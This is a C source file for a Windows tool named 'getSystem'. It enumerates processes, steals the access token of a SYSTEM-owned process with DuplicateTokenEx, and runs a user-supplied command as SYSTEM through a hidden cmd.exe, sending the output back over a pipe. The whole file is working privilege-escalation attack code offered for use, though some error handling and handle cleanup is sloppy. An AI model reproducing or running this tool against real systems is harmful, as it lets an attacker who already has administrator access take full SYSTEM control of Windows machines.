#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <UserEnv.h>
#include <tchar.h>
#include "EnablePriv.h"

#define MAX_PATH 35
#define MAX_ARRAY 35
#define NAME_ARRAY 200

int protected_check(DWORD pid, char* cmd);
BOOL system_check(PROCESSENTRY32 process);
void token_elevation(HANDLE process, char* cmd);

typedef struct _process {
	PROCESSENTRY32 pprocess;
	struct process* next;
} process;

typedef struct _protected_process {
	PROCESSENTRY32 pprotected;
} protected_process;

int system_check_flag = 0;
DWORD WINAPI ThreadProc(LPVOID lpParam) {
	BYTE b[1030];
	DWORD d = 0;
	while (ReadFile((HANDLE)lpParam, b, 1024, &d, 0))
	{
		b[d] = '\0';
		printf("%s", b);
		fflush(stdout);
	}
	return 0;
}

int main(int argc, char* argv[])
{
	printf("[+] getSystem Modify by Uknow\n");
	if (argc != 2)
	{
		printf("[+] usage: getSystem command \n");
		printf("[+] eg: getSystem \"whoami /all\" \n");
		return -1;
	}
	process* head, * position = NULL;
	PROCESSENTRY32 each_process, entry;
	HANDLE snapshot_proc;
	BOOL first_result, system_process;
	protected_process protected_arr[MAX_ARRAY];
	int protected_count = 0;

	//Uncomment to enable token privileges
	/*BOOL debug_result = EnablePriv();
	if (!debug_result) {
		printf("[!] Error: Failed to acquire Privileges!\n\n");
	}
	else
		printf("[+] SeRestore Privilege Acquired!\n\n");*/

	snapshot_proc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot_proc == INVALID_HANDLE_VALUE) {
		printf("[!] Error: Could not return handle on snapshot");
		exit(1);
	}

	each_process.dwSize = sizeof(PROCESSENTRY32);
	first_result = Process32First(snapshot_proc, &each_process);
	if (!first_result) {
		printf("[!] Error: Could not grab first process");
		exit(1);
	}

	//Linked list used for future examples on access to different processes for different actions
	//Create first node in linked list
	process* new_entry = (process*)malloc(sizeof(process));
	if (new_entry == NULL) {
		printf("[!] Could not assign new entry on heap!");
		exit(1);
	}

	//The first entry in the linked list is mapped by the head pointer
	new_entry->pprocess = each_process;
	new_entry->next = NULL;
	head = new_entry;

	system_process = system_check(each_process);
	if (system_process) {
		int protection_result = protected_check(each_process.th32ProcessID, argv[1]);
		if (protection_result) {
			protected_arr[protected_count].pprotected = each_process; //added protected processes to array for future use
			protected_count += 1;
		}
	}

	while (Process32Next(snapshot_proc, &each_process)) {
		position = head;
		while (position->next != NULL)
			position = position->next;
		process* next_entry = (process*)malloc(sizeof(process));
		if (new_entry == NULL) {
			printf("[!] Could not assign new entry on heap!");
			exit(1);
		}
		next_entry->pprocess = each_process;
		next_entry->next = NULL;
		position->next = next_entry;

		//after finding the System process once we ignore the system_check function going forward
		if (!system_check_flag) {
			system_process = system_check(each_process);
			if (!system_process)
				continue;
		}

		int protection_result = protected_check(each_process.th32ProcessID, argv[1]);
		if (protection_result) {
			if (protected_count != MAX_ARRAY) {
				protected_arr[protected_count].pprotected = each_process;
				protected_count += 1;
			}
		}

	}
	CloseHandle(snapshot_proc);
}

int protected_check(DWORD pid, char* cmd) {
	HANDLE proc_handle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (proc_handle == NULL) {
		HANDLE proc_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid); //required for protected processes
		token_elevation(proc_handle, cmd);
		return 1;
	}
	token_elevation(proc_handle, cmd);
	return 0;
}

//This function serves to skip over the "System" process
//Trying to steal its token fails and delays code execution
//Once this function returns FALSE it means the System process
//has been found and this function is no longer needed
BOOL system_check(PROCESSENTRY32 process) {
	CHAR* system_process = "System";
	int comparison = 0;

	for (int i = 0; i < MAX_PATH; i++) {
		if (process.szExeFile[i] == '\0')
			break;
		else if (process.szExeFile[i] == *system_process) {
			system_process++;
			comparison++;
		}
		else
			break;
	}
	if (wcslen(process.szExeFile) == comparison) {
		system_check_flag++;
		return FALSE;
	}
	return TRUE;
}

//This function's objective is to get the user of a process and check if
//it is SYSTEM
BOOL GetUserInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
	DWORD token_size, name_size = NAME_ARRAY, domain_size = NAME_ARRAY;
	PTOKEN_USER token_user;
	SID_NAME_USE sid_type;
	int comparison = 0;
	PTCHAR arr_cmp = L"SYSTEM";

	GetTokenInformation(token, TokenUser, NULL, 0, &token_size);
	token_user = (PTOKEN_USER)malloc(token_size);
	BOOL result = GetTokenInformation(token, TokenUser, token_user, token_size, &token_size);
	if (!result) {
		printf("[!] Error: Could not obtain user token information!\n");
		return 1;
	}
	else {
		result = LookupAccountSid(NULL, token_user->User.Sid, account_name, &name_size, domain_name, &domain_size, &sid_type);
		if (!result) {
			printf("[!] Error: Could not get user details!\n");
		}
	}
	free(token_user);

	int arr_length = wcslen(account_name);

	for (int z = 0; z < NAME_ARRAY; z++) {
		if (*account_name == '\0')
			break;
		else if (*account_name == *arr_cmp) {
			comparison++;
			account_name++;
			arr_cmp++;
		}
		else
			break;
	}
	if (comparison == arr_length)
		return TRUE;
	else
		return FALSE;
}

//this function's objective is to get the owner of the process and check if
//it is part of the Administrators group
BOOL GetOwnerInfo(HANDLE token, PTCHAR account_name, PTCHAR domain_name) {
	DWORD token_size = NULL, name_size = NAME_ARRAY, domain_size = NAME_ARRAY;
	PTOKEN_OWNER token_owner;
	SID_NAME_USE sid_type;
	int comparison = 0;
	PTCHAR arr_cmp = L"Administrators";
	SecureZeroMemory(account_name, NAME_ARRAY);
	SecureZeroMemory(domain_name, NAME_ARRAY);

	GetTokenInformation(token, TokenOwner, NULL, 0, &token_size);
	token_owner = (PTOKEN_OWNER)malloc(token_size);
	BOOL result = GetTokenInformation(token, TokenOwner, token_owner, token_size, &token_size);
	if (!result) {
		printf("[!] Error: Could not obtain owner token information!\n");
	}
	else {
		result = LookupAccountSid(NULL, token_owner->Owner, account_name, &name_size, domain_name, &domain_size, &sid_type);
		if (!result) {
			printf("[!] Error: Could not get user details!\n");
		}
	}
	free(token_owner);

	int arr_length = wcslen(account_name);

	for (int z = 0; z < NAME_ARRAY; z++) {
		if (*account_name == '\0')
			break;
		else if (*account_name == *arr_cmp) {
			comparison++;
			account_name++;
			arr_cmp++;
		}
		else
			break;
	}
	if (comparison == arr_length)
		return TRUE;
	else
		return FALSE;
}

//This function will attempt to duplicate a SYSTEM token and create 
//a new process with it. If successful SYSTEM shell obtained
void token_elevation(HANDLE process, char* cmd) {
	wchar_t wtext[512];
	mbstowcs(wtext, cmd, strlen(cmd) + 1);//Plus null
	LPWSTR ptr = wtext;
	WCHAR n[1024] = L"/c ";
	_tcscat_s(n, 512, ptr);
	TCHAR account_name[NAME_ARRAY], domain_name[NAME_ARRAY];
	HANDLE ptoken, new_token;
	STARTUPINFO startupinfo = { 0 };
	PROCESS_INFORMATION procinfo = { 0 };
	BOOL user_check, owner_check, duplicated;
	SECURITY_ATTRIBUTES sa = { 0 };
	HANDLE hRead, hWrite;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = 1;
	BOOL flag = CreatePipe(&hRead, &hWrite, &sa, 1024);
	startupinfo.hStdError = hWrite;
	startupinfo.hStdOutput = hWrite;
	startupinfo.lpDesktop = L"WinSta0\\Default";
	startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	startupinfo.wShowWindow = SW_HIDE;
	HANDLE hReadThread = CreateThread(NULL, 0, ThreadProc, hRead, 0, NULL);
	HANDLE hPrimary;
	BOOL result = OpenProcessToken(process, MAXIMUM_ALLOWED, &ptoken); //
	if (!result) {
		//printf("[!] Error: Could not open handle to token\n");
		return 1;
	}

	user_check = GetUserInfo(ptoken, account_name, domain_name);
	owner_check = GetOwnerInfo(ptoken, account_name, domain_name);

	if (user_check & owner_check) {
		result = DuplicateTokenEx(ptoken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &new_token);
		if (result) {
			printf("[+] Token Duplicated\n");
			duplicated = CreateProcessWithTokenW(new_token, 0, L"C:\\Windows\\System32\\cmd.exe", n, CREATE_NO_WINDOW, NULL, NULL, &startupinfo, &procinfo);
			if (duplicated) {
				if (flag) {
					printf("[+] CreatePipe success\n");
				}
				printf("[+] Command : \"c:\\Windows\\System32\\cmd.exe\" \"%S\"\n", n);
				printf("[+] Process with pid: %d created.\n==============================\n\n", procinfo.dwProcessId);
				fflush(stdout);
				WaitForSingleObject(procinfo.hProcess, -1);
				TerminateThread(hReadThread, 0);
				CloseHandle(&startupinfo);
				CloseHandle(&procinfo);
				exit(1);
			}
			else
			{
				printf("[!] FAIL");
			}
		}
	}
}



